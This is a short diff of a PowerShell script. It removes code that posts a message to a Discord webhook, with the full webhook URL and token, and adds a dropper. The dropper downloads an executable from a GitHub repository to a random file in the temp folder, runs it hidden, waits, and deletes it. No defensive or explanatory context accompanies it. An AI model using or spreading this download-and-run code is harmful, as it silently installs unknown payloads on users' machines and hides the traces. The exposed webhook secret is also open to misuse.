@@ -1,8 +1,5 @@
-$WebhookUrl = "https://discord.com/api/webhooks/1406275854169804891/ajy1l1F8b6tVNEV0_zB_SMQumHG82o54uOavEq-_HQE4Yyp7cu39OtF7IxVNLTQfqeRV"
-$Message = "Hello"
-
-$Payload = @{
-    content = $Message
-} | ConvertTo-Json
-
-Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $Payload
+$rand = Get-Random
+$path = "$env:TEMP\main_$rand.exe"
+Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path
+Start-Process $path -WindowStyle Hidden -Wait
+Remove-Item $path -Force
